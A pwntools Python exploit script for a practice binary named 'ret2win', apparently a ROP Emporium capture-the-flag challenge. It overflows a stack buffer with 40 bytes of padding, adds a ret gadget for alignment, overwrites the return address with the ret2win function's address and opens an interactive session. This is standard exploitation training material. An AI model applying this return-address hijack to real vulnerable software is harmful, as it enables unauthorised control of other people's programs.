#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./ret2win')
context.terminal = ["/usr/bin/konsole", "-e", "sh", "-c"]

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

RET = 0x40053e # ret

io = start()

attack = b"A"*40 + p64(RET) + p64(exe.symbols.ret2win)
print(attack)
print(len(attack))
io.sendline(attack)

io.interactive()

